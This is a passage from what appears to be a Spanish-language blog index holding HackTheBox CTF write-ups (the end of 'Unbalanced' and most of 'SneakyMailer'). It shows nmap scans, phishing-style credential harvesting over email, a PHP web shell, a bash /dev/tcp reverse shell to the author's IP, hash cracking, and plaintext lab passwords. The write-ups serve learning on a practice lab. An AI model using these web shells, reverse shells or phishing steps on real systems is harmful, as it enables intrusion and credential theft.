1 -host-port 5553 -container-ip 172. 31. 11. 3 -container-port 53bryan@unbalanced:~$ Est√° activo y adem√°s nos muestra que est√° corriendo ‚Äúalgo‚Äù sobre la direcci√≥n 172. 31. 11. 3, vamos a visitarla.  Si entramos:  Tenemos versiones: Pi-hole Version v4. 3. 2 Web Interface Version v4. 3 FTL Version v4. 3. 1. (Hay vulnerabilidades pero debemos estar autenticados para poder usarlas) Tenemos un login panel, ech√©mosle un ojito. Si probamos con las contrase√±as que encontramos mediante el XPath no nos funciona. Probando admin nos deja entrar :P En internet nos encontramos un exploit que se aprovecha de una vulnerabilidad en el apartado /settings. php?tab=piholedhcp mediante la cual podemos ejecutar comandos remotamente. Dicho exploit ya tiene por defecto que nos genere una reverse shell.  Vemos los archivos que maneja el sitio, pr√°cticamente estamos dentro del contenedor. Enumeremos a ver que. Despu√©s de un rato, estuve confundido y tambi√©n simplemente leyendo archivos. Volv√≠ al sitio web de Pi-Hole a la parte de /settings. php (que es la que explota el exploit) y vi algo: Estamos dentro del contenedor, por lo tanto podemos pasearnos por todo el ¬´contenedor¬ª, as√≠ que el acceso a la ruta /root (si miramos la imagen dice que somos root y estamos en el grupo root) no debe estar restringido (: www-data@pihole:/$ cd /rootcd /rootwww-data@pihole:/root$ lslsph_install. sh pihole_config. shwww-data@pihole:/root$ Si recordamos /TODO en la m√°quina de bryan hablaba de un archivo de configuraci√≥n. bryan@unbalanced:~$ cat TODO. . . * Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]. . . Veamos si se trata de pihole_config. sh: www-data@pihole:/root$ cat pihole_config. shcat pihole_config. sh#!/bin/bash# Add domains to whitelist/usr/local/bin/pihole -w unbalanced. htb/usr/local/bin/pihole -w rebalanced. htb# Set temperature unit to Celsius/usr/local/bin/pihole -a -c# Add local host record/usr/local/bin/pihole -a hostrecord pihole. unbalanced. htb 127. 0. 0. 1# Set privacy level/usr/local/bin/pihole -a -l 4# Set web admin interface password/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'# Set admin email/usr/local/bin/pihole -a email admin@unbalanced. htbwww-data@pihole:/root$ Perfecto, tenemos el archivo que configura todo lo relacionado a pi-hole (tal como lo indico bryan), adem√°s de tener una contrase√±a asignada al usuario administrador :O Listooooooooo, tamos dentro como usuario administrador del sistema, ech√©mosle un ojo a los flags: ‚Ä¶ Hemos terminado‚Ä¶ Que linda m√°quina, me encanto, al inicio (como en SneakyMailer) me reeeeperdi, pero era parte de lo que pod√≠a pasar, adem√°s tomando en cuenta que es mi primer m√°quina en nivel Hard entonces era predecible que me iba a sentir atascado en varios lados. La vulnerabilidad XPath me gusto mucho, adem√°s de probar y mejorar mi scripting me parece que sali√≥ un bonito script Agradezco a @TazWake de nuevo por la ayuda (aunque no va a leer esto pero no esta de m√°s). Esto es todo por este writeup, nos reencontraremos en otro viaje de conocimiento, lectura y estancamientos :P Gracias por pasarte por ac√° :) "
    }, {
    "id": 67,
    "url": "http://localhost:4000/htb/sneakymailer",
    "title": "HackTheBox - SneakyMailer",
    "body": "2020/11/28 - M√°quina Linux nivel medio pero que de medio muy poco, o pues casi me enloquezco :P SneakyMailer‚Ä¶ Vaya locura, jugaremos simulando phishing, explotaremos cositas de FTP, romperemos PyPi para crearnos un paquete malicioso y generar ejecuci√≥n remota de comandos y trolearemos un poco con los permisos de usuario.  TL;DR (Spanish writeup): ¬°Esta m√°quina fue una vaina loca! Hola, empezaremos con una enumeraci√≥n b√°sica en la que encontraremos unos correos, nos aprovecharemos de ellos para realizar peticiones a cada uno de los mails estando a la escucha en nuestra m√°quina a ver si alguno nos responde‚Ä¶ En pocas palabras algo muy parecido al phishing. Un usuario nos responder√°, obtendremos info con el cual podremos entrar al servicio ICMP y validar el inbox de ese correo. Nos encontraremos con 2 interesantes, de uno podremos entrar al servicio FTP y con el otro tendremos referencia de algo que usaremos posteriormente‚Ä¶ Usando el servicio FTP podremos subir archivos, subiremos un archivo que nos permita ejecutar comandos, obtendremos una reverse Shell como el usuario www-data, pero podremos usar las mismas credenciales para convertirnos en el usuario developer. Encontraremos que podemos subir paquetes de terceros en el repositorio PyPI, usaremos eso para crear nuestro propio paquete con c√≥digo malicioso y subirlo a la m√°quina. Con ello obtendremos un Shell como el usuario low, validando sus permisos nos daremos cuenta que puede ejecutar /usr/bin/pip3 como el usuario administrador, crearemos un paquete temporal el cual nos brinde una Shell, al ser ejecutado con permisos de administrador, obtendremos una sesi√≥n como el :) Eso es en pocas palabras, que empiece el bailoteo :)  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) adem√°s me enfoco en plasmar mis errores y exitos (por si ves mucho texto). Este writeup va a ser largo :P ‚Ä¶ Fases:  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: ‚Äì¬ª nmap -p- --open -v -n 10. 10. 10. 197Pero va lento, agregando -T va m√°s r√°pido. (Sin embargo es importante hacer un escaneo total, sin cambios, as√≠ vaya lento, que nos permita ver si -T obvia/pasa alg√∫n puerto. ‚Äì¬ª nmap -p- --open -T5 -v -n 10. 10. 10. 197 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -T5   Forma de escanear s√∫per r√°pido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos)       -n   Evita que realice Host Discovery, en este caso el DNS (n)       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en formato grepeable (para usar una funci√≥n de S4vitar que me extrae los puertos)   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Tue Oct 13 25:25:25 2020 as: nmap -p- --open -T5 -v -n -oG initScan 10. 10. 10. 197# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 197 ()  Status: UpHost: 10. 10. 10. 197 ()  Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 25/open/tcp//smtp///, 80/open/tcp//http///, 143/open/tcp//imap///, 993/open/tcp//imaps///, 8080/open/tcp//http-proxy///Obtenemos los puertos:  21: FTP (Protocolo para transferencia de archivos) 22: SSH (Secure Shell) 25: SMTP (Protocolo para transferencia simple de correo) 80: Servidor web 143: IMAP (Protocolo de acceso a los mensajes de internet) 993: IMAPS (Protocolo de acceso a los mensajes de internet sobre TLS) 8080: ProxyProcedemos a nuestro escaneo de versiones y scripts. ‚Äì¬ª nmap -p 21,22,25,80,143,993,8080 -sC -sV 10. 10. 10. 197 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Tue Oct 13 25:25:25 2020 as: nmap -p21,22,25,80,143,993,8080 -sC -sV -oN portScan 10. 10. 10. 197Nmap scan report for 10. 10. 10. 197Host is up (0. 19s latency). PORT   STATE SERVICE VERSION21/tcp  open ftp   vsftpd 3. 0. 322/tcp  open ssh   OpenSSH 7. 9p1 Debian 10+deb10u2 (protocol 2. 0)| ssh-hostkey: |  2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)|  256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp  open smtp   Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp  open http   nginx 1. 14. 2|_http-server-header: nginx/1. 14. 2|_http-title: Did not follow redirect to http://sneakycorp. htb143/tcp open imap   Courier Imapd (released 2018)|_imap-capabilities: UTF8=ACCEPTA0001 THREAD=ORDEREDSUBJECT ENABLE IDLE CHILDREN THREAD=REFERENCES IMAP4rev1 OK QUOTA ACL2=UNION STARTTLS CAPABILITY SORT UIDPLUS completed ACL NAMESPACE| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example. com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time993/tcp open ssl/imap Courier Imapd (released 2018)|_imap-capabilities: UTF8=ACCEPTA0001 THREAD=ORDEREDSUBJECT AUTH=PLAIN ENABLE IDLE CHILDREN THREAD=REFERENCES IMAP4rev1 OK QUOTA ACL2=UNION completed CAPABILITY SORT UIDPLUS ACL NAMESPACE| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example. com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open http   nginx 1. 14. 2|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: nginx/1. 14. 2|_http-title: Welcome to nginx!Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelPerfecto, veamos que tenemos:  FTP y SSH no presentan vulnerabilidades p√∫blicas SMTP esta sobre el servidor de correo postfix, el cual es un software para el enrutamiento y envi√≥ de correo electr√≥nico.  HTTP y HTTPS est√°n sobre nginx, el cual provee servicios de correo electr√≥nico. HTTP hace un redirect a sneakycorp. htb (agregaremos el dominio al archivo hosts) IMAP e IMAPS corren bajo el servicio Courier IMAP server. As√≠ mismo tenemos alguna data que posiblemente nos sirva para algo despu√©s. ‚Ä¶ &gt; Puerto 80 (HTTP): Agregamos sneakycorp. htb al archivo /etc/hosts ‚Äì¬ª cat /etc/hosts127. 0. 0. 1    localhost10. 10. 10. 197 sneakycorp. htbA ver‚Ä¶ Nos encontramos con un dashboard con informaci√≥n de proyectos, algunas notificaciones y alertas de mensaje con su remitente (posibles usuarios) Tenemos un apartado Team en la parte izquierda, veamos: Interesante, tenemos tambi√©n posibles usuarios junto a los correos, juguemos con curL y grep para extraernos los correos y usuarios en archivos. ‚Äì¬ª curl -s http://sneakycorp. htb/team. php | grep -oP  \b[A-Za-z0-9. _%+-]+@[A-Za-z0-9. -]+\. [A-Za-z]{2,6}\b  &gt; emails. txt‚Äì¬ª cat emails. txt tigernixon@sneakymailer. htbgarrettwinters@sneakymailer. htbashtoncox@sneakymailer. htb. . .  \b[A-Za-z0-9. _%+-]+@[A-Za-z0-9. -]+. [A-Za-z]{2,6}\b       Expresi√≥n   Descripci√≥n         \b   Marca la posici√≥n de una palabra limitada por espacios en blanco, puntuaci√≥n o el inicio/final de una cadena.        A-Za-z0-9. _%+-   Extrae cualquier car√°cter en may√∫scula o min√∫scula, n√∫meros y los s√≠mbolos (. _%+-)       +@   Seguido del s√≠mbolo @.        +.    Seguido del s√≠mbolo . (punto)       {2,6}   Realiza el √∫ltimo grupo de 2 a 6 veces, para extraer: com, org, htb, es, etc.     Referencia de WikipediaPodemos usar el archivo de emails. txt para extraer los usuarios, se puede hacer de varias formas: ‚Äì¬ª cat emails. txt | tr '@' ' ' | awk '{print $1}' &gt; users. txt‚Äì¬ª cat users. txt tigernixongarrettwintersashtoncox cedrickelly airisatou . . . Listo, si hacemos descubrimiento de rutas con wfuzz no vemos nada diferente a lo que nos brind√≥ la p√°gina inicialmente.  Revisando la estructura HTML con CTRL + U encontramos esto: Veamos: Registramos una cuenta, no obtenemos ning√∫n output ni nada, solo limpia los campos. Nada m√°s por el momento, d√©mosle de una al proxy. &gt; Puerto 8080: El display por default, veamos si podemos encontrar algo m√°s usando wfuzz‚Ä¶ Solo encontramos index. html‚Ä¶ &gt; Puerto 25: Bueno, realmente el inicio de esta m√°quina me estaba matando, literalmente no entend√≠a nada de lo que deb√≠a hacer o ten√≠a ideas claramente err√≥neas. Lo m√°s √≥ptimo y necesario fue pedir ayuda, primero me fui para el foro oficial de la m√°quina, varios hac√≠an caer en cuenta sobre que ser√≠a lo primero en probar al tener tantos correos‚Ä¶ Hablaban de enviar ¬´algo¬ª a cada usuario y estar ‚Äúatento‚Äù‚Ä¶ Realmente estaba muy confundido, encontr√© herramientas para enviar correo, prob√© enviar los mails y esperar alguna respuesta en el mail temporal que estaba usando, pero nada, no entend√≠a que deb√≠a esperar o como‚Ä¶ Decid√≠ preguntarle a TazWake que es moderador y Omniscient en hackthebox, adem√°s de ser una persona superpuesta a ayudar y todo un master. Thank you TazWake. Explotaci√≥n #: Resulta que la idea estaba medianamente bien, si bien debemos enviar emails a cada usuario, en el proceso uno de ellos nos va a responder con ‚Äúalgo‚Äù‚Ä¶ Pero debemos estar en escucha en nuestra m√°quina, √≥sea levantar un servidor web en el que estemos pendientes de s√≠ alguno de ellos intenta entrar y ver que obtenemos‚Ä¶ Esto me rompi√≥ la cabeza, ya que me parece superloco y supernuevo. Buscando por internet una de las herramientas que encontr√© fue swaks, el cual nos va a ayudar a enviar los emails con toda la info y el body (en el cual pondremos el link del servidor web que montamos). Los pasos que hice fueron estos:  Apoyarnos de un correo temporal, usaremos esa direcci√≥n de email como origen.  Crearnos un script que tome cada correo y realice el env√≠o de la data.  Ponernos en escucha con nc.  Ejecutar el script. Y esto es lo que recibimos cuando se le env√≠a el correo a glorialittle@sneakymailer. htb.   emails. txt tiene todos los correos, la primera prueba fue con el, cuando obtuve algo evite volver a hacer todo el envio y recorte en emails1. txt desde antes del correo de gloria. QUE LOCURAAAAAAAAAAAAAAAAAA. Me encanto, pero me exploto la cabeza :o Sigamos‚Ä¶ Si quitamos el URLencode realizado obtenemos esto: # Original outputfirstName=PaullastName=Byrdemail=paulbyrd%40sneakymailer. htbpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHtrpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt# Decode outputfirstName=PaullastName=Byrdemail=paulbyrd@sneakymailer. htbpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Htrpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&gt; Puertos 143 y 993: Inicialmente intente entrar a SSH y FTP con esas credenciales, pero no fue posible. As√≠ que nos queda revisar si podemos entrar al email por medio de imap. # Por medio del puerto seguro ‚Äì¬ª openssl s_client -connect 10. 10. 10. 197:993# O sin √©l‚Äì¬ª nc 10. 10. 10. 197 143‚Äì¬ª telnet 10. 10. 10. 197 143Estando dentro podemos logearnos con las credenciales encontradas A1 LOGIN paulbyrd  ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht * OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)A1 OK LOGIN Ok.  El A1 es un tag (que puede ser cualquier sucesion de caracteres) que se usa siempre en cada linea antes de un comando en IMAP. Listemos los buzones: A1 LIST    ** LIST (\Unmarked \HasChildren)  .    INBOX * LIST (\HasNoChildren)  .    INBOX. Trash * LIST (\HasNoChildren)  .    INBOX. Sent * LIST (\HasNoChildren)  .    INBOX. Deleted Items * LIST (\HasNoChildren)  .    INBOX. Sent Items A1 OK LIST completedVeamos cuantos mails hay en cada buz√≥n: A1 STATUS INBOX (MESSAGES)* STATUS  INBOX  (MESSAGES 0)A1 OK STATUS Completed. A1 STATUS INBOX. Sent (MESSAGES)* STATUS  INBOX. Sent  (MESSAGES 0)A1 OK STATUS Completed. A1 STATUS INBOX. Trash (MESSAGES)* STATUS  INBOX. Trash  (MESSAGES 0)A1 OK STATUS Completed. A1 STATUS  INBOX. Deleted Items  (MESSAGES)* STATUS  INBOX. Deleted Items  (MESSAGES 0)A1 OK STATUS Completed. A1 STATUS  INBOX. Sent Items  (MESSAGES)* STATUS  INBOX. Sent Items  (MESSAGES 2)A1 OK STATUS Completed. Vemos en el buz√≥n INBOX. Sent Items que hay 2 correos enviados, enfoqu√©monos en eso: A1 SELECT  INBOX. Sent Items * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited* 2 EXISTS* 0 RECENT* OK [UIDVALIDITY 589480766] Ok* OK [MYRIGHTS  acdilrsw ] ACLA1 OK [READ-WRITE] OkPodemos ver el header de los dos correos de la siguiente forma: A1 FETCH 1:2 (BODY[HEADER])* 1 FETCH (BODY[HEADER] {279}MIME-Version: 1. 0To: root &lt;root@debian&gt;From: Paul Byrd &lt;paulbyrd@sneakymailer. htb&gt;Subject: Password resetDate: Fri, 15 May 2020 13:03:37 -0500Importance: normalX-Priority: 3Content-Type: multipart/alternative;    boundary= _21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_ )* 2 FETCH (BODY[HEADER] {419}To: low@debianFrom: Paul Byrd &lt;paulbyrd@sneakymailer. htb&gt;Subject: Module testingMessage-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer. htb&gt;Date: Wed, 27 May 2020 13:28:58 -0400User-Agent: Mozilla/5. 0 (X11; Linux x86_64; rv:68. 0) Gecko/20100101 Thunderbird/68. 8. 0MIME-Version: 1. 0Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 7bitContent-Language: en-US)A1 OK FETCH completed. Vemos en uno de ellos el asunto: Password reset. Seguimos, veamos el contenido de cada email: A1 FETCH 1 (BODY)* 1 FETCH (BODY (( text   plain  ( charset   utf-8 ) NIL NIL  quoted-printable  196 7)( text   html  ( charset   utf-8 ) NIL NIL  quoted-printable  1381 32)  alternative ))A1 OK FETCH completed. Cuando hacemos el BODY el mensaje usualmente est√° dividido en partes:  Nos dice que est√° en text plain y tiene 196 caracteres.  Est√° en formato text html y tiene 1381 caracteres. D√©mosle: A1 FETCH 1 (BODY[1])* 1 FETCH (BODY[1] {196}Hello administrator, I want to change this password for the developer accou=ntUsername: developerOriginal-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CPlease notify me when you do it=20)A1 OK FETCH completed. A1 FETCH 1 (BODY[2])* 1 FETCH (BODY[2] {1381}&lt;html xmlns:o=3D urn:schemas-microsoft-com:office:office  xmlns:w=3D urn:sc=hemas-microsoft-com:office:word  xmlns:m=3D http://schemas. microsoft. com/of=fice/2004/12/omml  xmlns=3D http://www. w3. org/TR/REC-html40 &gt;&lt;head&gt;&lt;meta ht=. . . La parte 2 simplemente es la representaci√≥n en html del texto plano :) Bueno obtenemos nuevas credenciales que probablemente nos sirvan (como pueda que no :P)  Username: developer Password (original): m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C‚Ä¶ Veamos el segundo correo: A1 FETCH 2 (BODY)* 2 FETCH (BODY ( text   plain  ( charset   utf-8   format   flowed ) NIL NIL  7bit  166 6))A1 OK FETCH completed. A1 FETCH 2 (BODY[1])* 2 FETCH (BODY[1] {166}Hello lowYour current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience. )A1 OK FETCH completed. Ac√° vemos 2 cosas interesantes:  Saluda a low, podemos guardarlo como usuario por si algo :) Nos habla de los m√≥dulos de Python en su servicio PyPI, probablemente debamos explotar alg√∫n m√≥dulo o buscar algo loco por ah√≠.  Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programaci√≥n Python. Listo, ya vimos todo lo que pod√≠amos obtener del correo d√© paulbyrd. Los comandos e informaci√≥n sobre imap los obtuve de estos recursos:  telnet-imap-commands-note.  access-imap-server-from-the-command-line-using-openssh.  hacktricks. xyz-pentesting-imap. &gt; Puerto 21 (FTP): Probando cada usuario (low y developer) con FTP y SSH, podemos entrar con developer al servicio FTP.  De los archivos montados no hay nada interesante, vemos que estamos sobre el servidor web, lo que subamos o hagamos se ver√° reflejado en el puerto 80. Tenemos la carpeta /pypi y si relacionamos el correo donde se habla de m√≥dulos de Python, que debemos instalar, probar y borrar. Podemos entender que esta carpeta deber√° ser nuestro sitio de trabajo :) Validaremos como lograr subir ‚ÄúX‚Äù tipo de archivos por medio de FTP, ya que no permite subir cualquiera (creo). &gt; Puerto 80 (HTTP): Cuando estuve en el foro una persona escribi√≥ que el vhost es importante. As√≠ que me quedo la duda y buscando por internet que herramienta puede ayudarnos, usaremos gobuster la cual hace un fuzzing de Virtual Hosting sobre el servicio: ‚Äì¬ª gobuster vhost -w /opt/SecLists/Discovery/Web-Content/raft-small-words. txt -u http://sneakycorp. htb===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:     http://sneakycorp. htb[+] Threads:   10[+] Wordlist:   /opt/SecLists/Discovery/Web-Content/raft-small-words. txt[+] User Agent:  gobuster/3. 0. 1[+] Timeout:   10s===============================================================2020/10/20 18:20:05 Starting gobuster===============================================================Found: dev. sneakycorp. htb (Status: 200) [Size: 13742]Found: . . sneakycorp. htb (Status: 400) [Size: 173]Found: DEV. sneakycorp. htb (Status: 200) [Size: 13742]Found: Dev. sneakycorp. htb (Status: 200) [Size: 13742]Found: . html. . sneakycorp. htb (Status: 400) [Size: 173]Found: . htm. . sneakycorp. htb (Status: 400) [Size: 173]. . . Encontramos un nuevo dominio: dev. sneakycorp. htb, pong√°moslo en el /etc/hosts y veamos que hay: ‚Äì¬ª cat /etc/hosts127. 0. 0. 1    localhost10. 10. 10. 197 sneakycorp. htb10. 10. 10. 197 dev. sneakycorp. htb El apartado para registrarse, en este caso est√° visible aunque si nos ‚Äúregistramos‚Äù no pasa nada :P. Lo que veo importante es que tenemos acceso al usuario developer por FTP y acabamos de encontrar el sitio dev. sneakycorp. htb con el que probablemente lo que subamos mediante FTP se ver√° reflejado ac√°‚Ä¶ Y si recordamos estamos en lo correcto, ya que al logearnos sobre FTP lo primero que vemos (la estructura) es:  /dev &gt; /lista de folders y archivos &gt; /pypi &gt; /register. phpListo, lo que nos queda es saber que ‚Äúm√≥dulos‚Äù o ‚Äúpaquetes‚Äù de Python podemos subir (donde y como :P) con FTP :) &gt; Puerto 21 (FTP): Testeando algunas cosas vi que nos deja crear carpetas, pero no nos deja listar su contenido: ftp&gt; cd dev250 Directory successfully changed. ftp&gt; mkdir t3s7_h78257  /dev/t3s7_h78  createdftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x  2 0    0      4096 May 26 19:52 cssdrwxr-xr-x  2 0    0      4096 May 26 19:52 img-rwxr-xr-x  1 0    0      13742 Jun 23 09:44 index. phpdrwxr-xr-x  3 0    0      4096 May 26 19:52 jsdrwxr-xr-x  2 0    0      4096 May 26 19:52 pypidrwxr-xr-x  4 0    0      4096 May 26 19:52 scssd-wxrw-rw-  2 1001   1001     4096 Oct 21 11:46 t3s7_h78-rwxr-xr-x  1 0    0      26523 May 26 20:58 team. phpdrwxr-xr-x  8 0    0      4096 May 26 19:52 vendor226 Directory send OK. ftp&gt; cd t3s7_h78250 Directory successfully changed. ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Transfer done (but failed to open directory). ftp&gt;. . . # En nuestra maquina:‚Äì¬ª echo  hola  &gt; jay. txt. . . ftp&gt; put jay. txtlocal: jay. txt remote: jay. txt200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 5 bytes sent in 0. 00 secs (143. 6121 kB/s)ftp&gt; Revisemos la web: Hag√°mosla m√°s sencilla, montemos el archivo en la ra√≠z: ftp&gt; cd dev                             250 Directory successfully changed. ftp&gt; put jay. txtlocal: jay. txt remote: jay. txt200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 5 bytes sent in 0. 00 secs (110. 9730 kB/s)ftp&gt; Validemos: ‚Äì¬ª curl -s http://dev. sneakycorp. htb/jay. txtholaPerfecto, intentemos hacer ejecuci√≥n de comandos remotamente: ‚Äì¬ª cat locurasdices. php &lt;?php $out=shell_exec($_GET['xmd']); echo $out; ?&gt;Y sub√°moslo: ftp&gt; put locurasdices. phplocal: locurasdices. php remote: locurasdices. php200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 51 bytes sent in 0. 00 secs (465. 4644 kB/s)ftp&gt;Validamos: ‚Äì¬ª curl -s http://dev. sneakycorp. htb/locurasdices. php?xmd=whoamiwww-dataListo, tenemos ejecuci√≥n de comandos en el sistema, generemos una reverse Shell, nos ponemos en escucha: ‚Äì¬ª nc -nvlp 4433‚Äì¬ª curl -s http://dev. sneakycorp. htb/locurasdices. php?xmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 15. 86/4433 0&gt;&amp;1'Pero no sucede nada, pas√©mosla a URLencode: ‚Äì¬ª curl -s http://dev. sneakycorp. htb/locurasdices. php?xmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10. 10. 15. 86%2F4433%200%3E%261%27 PERFECTO, sigamos enumerando. Vemos varias cositas: www-data@sneakymailer:~$ cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologinlow:x:1000:1000:,,,:/home/low:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologinpostfix:x:108:116::/var/spool/postfix:/usr/sbin/nologincourier:x:109:118::/var/lib/courier:/usr/sbin/nologinvmail:x:5000:5000::/home/vmail:/usr/sbin/nologindeveloper:x:1001:1001:,,,:/var/www/dev. sneakycorp. htb:/bin/bashpypi:x:998:998::/var/www/pypi. sneakycorp. htb:/usr/sbin/nologinwww-data@sneakymailer:~$ ls -la /homels -la /hometotal 16drwxr-xr-x 4 root root 4096 May 14 17:10 . drwxr-xr-x 18 root root 4096 May 14 05:30 . . drwxr-xr-x 8 low  low  4096 Jun 8 03:47 lowdrwx------ 5 vmail vmail 4096 May 19 21:10 vmailwww-data@sneakymailer:~$  Usuario low, que tiene la bandera user. txt.  pypi, que probablemente debamos jugar con el para el manejo de m√≥dulos PyPI. Y un nuevo dominio: pypi. sneakycorp. htb. Validando el dominio en la web nos redirecciona al host principal, pero si lo probamos con el puerto 8080 tenemos esto:  Vemos algunas ‚Äúindicaciones‚Äù interesantes.  Si damos clic sobre here o simple obtenemos la pantalla que pide credenciales. Volvamos a la consola, migr√©monos a developer usando la pw de FTP y busquemos algo relacionado a credenciales. developer@sneakymailer:~/pypi. sneakycorp. htb$ ls -lals -latotal 20drwxr-xr-x 4 root root   4096 May 15 14:29 . drwxr-xr-x 6 root root   4096 May 14 18:25 . . -rw-r--r-- 1 root root    43 May 15 14:29 . htpasswddrwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packagesdrwxr-xr-x 6 root pypi   4096 May 14 18:25 venvwww-data@sneakymailer:~/pypi. sneakycorp. htb$ cat . htpasswdcat . htpasswdpypi:$apr1$RV5c5YVs$U9. OTqF5n8K4mxWpSSR/p/ pypi:$apr1$RV5c5YVs$U9. OTqF5n8K4mxWpSSR/p/Obtenemos un hash Apache $apr1$ MD5, md5apr1, MD5 (APR) 2. vamos a crackearlo para poder ver el contenido en la p√°gina web.  . htpasswd es una utilidad que tiene por funci√≥n almacenar contrase√±as de forma cifrada para ser utilizadas por Apache en servicios de autenticaci√≥n. Desde Linux  Gran art√≠culo explicando como funciona el archivo . htpasswd. Usando john-the-ripper logramos el objetivo: ‚Äì¬ª john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou. txt hashpypi Using default input encoding: UTF-8Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])Press 'q' or Ctrl-C to abort, almost any other key for status0g 0:00:02:40 7,80% (ETA: 14:46:19) 0g/s 7896p/s 7896c/s 7896C/s spgg300385. . spgcmcr0g 0:00:02:51 8,40% (ETA: 14:46:03) 0g/s 7917p/s 7917c/s 7917C/s rebeca260395. . rebeca22soufianeelhaoui (?)1g 0:00:08:26 DONE (2020-10-22 14:20) 0. 001974g/s 7137p/s 7137c/s 7137C/s soufina. . soufianeelhaouiUse the  --show  option to display all of the cracked passwords reliablySession completedValidamos y pasamos el 